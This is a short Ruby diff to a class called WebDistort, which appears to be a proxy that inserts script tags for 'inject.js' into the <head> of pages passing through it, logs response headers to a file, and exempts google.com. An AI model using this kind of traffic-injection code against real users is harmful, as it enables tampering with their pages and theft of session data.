@@ -34,21 +34,24 @@ class WebDistort
 
       search_string = '<head>'
 
+	#prototype_data_file = File.open(@http_root + "/prototype.js", "r");
+	#prototype_data = prototype_data_file.read
+
       #js_data_file = File.open(@http_root + "/inject.js", "r")
       #js_data = js_data_file.read
       
       replace_string = "<head><script language='javascript' src='" + prototype_file + "'></script><script language='javascript' src='" + js_file + "'></script>"
-      #replace_string = "<script language='javascript'>" + js_data + "</script>"
-      puts replace_string
+      #replace_string = "<script language='javascript'>" + prototype_data + "</script>"
+#      puts replace_string
       gsub_string = "/" + search_string + "/"
-			puts gsub_string
+#puts gsub_string
      
       modified_body = body.gsub(search_string, replace_string)
       if modified_body != body
-        puts "Successfully modified body!"
+        #puts "Successfully modified body!"
         return modified_body
       else
-        puts "Body modification failed."
+        #puts "Body modification failed."
         return body
       end
     end
@@ -65,6 +68,11 @@ class WebDistort
     end
     
     def handle_contents(request, response)
+	if request.host =~ /google.com/
+		return response.body;
+	end
+	puts request.host;
+
       if response.content_type =~/text/ || response.content_type =~/javascript/
         if $header_file == nil
           $header_file = File.open(@data_dir + "/headers.txt", "a")
